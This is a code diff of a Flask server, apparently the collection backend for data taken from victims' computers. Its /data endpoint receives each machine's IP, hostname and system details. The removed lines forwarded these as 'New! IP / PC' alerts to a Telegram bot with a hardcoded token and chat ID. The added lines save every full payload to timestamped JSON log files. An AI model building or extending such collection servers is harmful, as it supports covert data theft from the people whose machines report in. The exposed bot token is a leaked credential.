@@ -1,21 +1,26 @@
 from flask import Flask, request
-import requests
+import json
+import os
+from datetime import datetime
 
 app = Flask(__name__)
 
-TOKEN = "8343596363:AAHYiZ0dqiHlbdq16_yrZt2MT2mxNjbpV0Q"
-CHAT_ID = 603507604
+# Создаем папку для логов
+if not os.path.exists('logs'):
+    os.makedirs('logs')
 
 @app.route('/data', methods=['POST'])
 def receive_data():
     data = request.get_json()
-    try:
-        ip = data.get('ip', {}).get('ip', 'Unknown')
-        pc = data.get('system', {}).get('hostname', 'Unknown')
-        msg = f"New! IP: {ip} PC: {pc}"
-        requests.get(f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={CHAT_ID}&text={msg}")
-    except Exception as e:
-        print(e)
+    
+    # Сохраняем в файл с временем
+    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
+    filename = f"logs/data_{timestamp}.json"
+    
+    with open(filename, 'w', encoding='utf-8') as f:
+        json.dump(data, f, indent=4, ensure_ascii=False)
+    
+    print(f"[+] Сохранено: {filename}")
     return 'OK', 200
 
 @app.route('/')
